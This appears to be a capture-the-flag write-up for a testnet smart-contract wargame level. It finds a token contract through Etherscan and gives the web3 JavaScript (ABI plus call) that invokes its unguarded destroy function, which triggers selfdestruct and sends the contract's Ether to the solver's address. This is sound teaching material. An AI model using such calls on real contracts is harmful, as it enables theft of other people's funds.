To solve this I opened the level instance contract in the Etherscan UI and browsed to the transaction which created it. In that transaction we can see [another contract created](https://ropsten.etherscan.io/address/0xb2203b6861426d45635b289db0b7b16cc3c84006#internaltx). This [other contract](https://ropsten.etherscan.io/address/0x92864705010ace29195b2f1d08d8a7780b2f7d7d) was presumably the token contract, which was verified by the fact that it had a 0.5 Ether balance, which the level description mentions we have to move.

Note that using the Etherscan UI is the easy route. We could have alternatively calculated the contract address which was created as they're created in a deterministic fashion.

Now all we have to do to solve this is call the `destruct` function on the contract, which anyone can call, which will invoke `selfdestruct` with an address we provide.

To call this method I used the following JavaScript:
```javascript
var abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            }
        ],
        "name": "destroy",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "name": "balances",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "_name",
                "type": "string"
            },
            {
                "name": "_creator",
                "type": "address"
            },
            {
                "name": "_initialSupply",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "payable": true,
        "stateMutability": "payable",
        "type": "fallback"
    }
]
var contract = web3.eth.contract(abi).at("0x92864705010ACe29195B2f1D08D8a7780b2f7D7d");
```

Now we call destroy on the token and specify our own address so we receive the Ether when the contract self destructs.
```javascript
contract.destroy("0x8e0ff062059376013fa56470805bec01b5ad06cc", (error, result) => {console.log(result);})
```
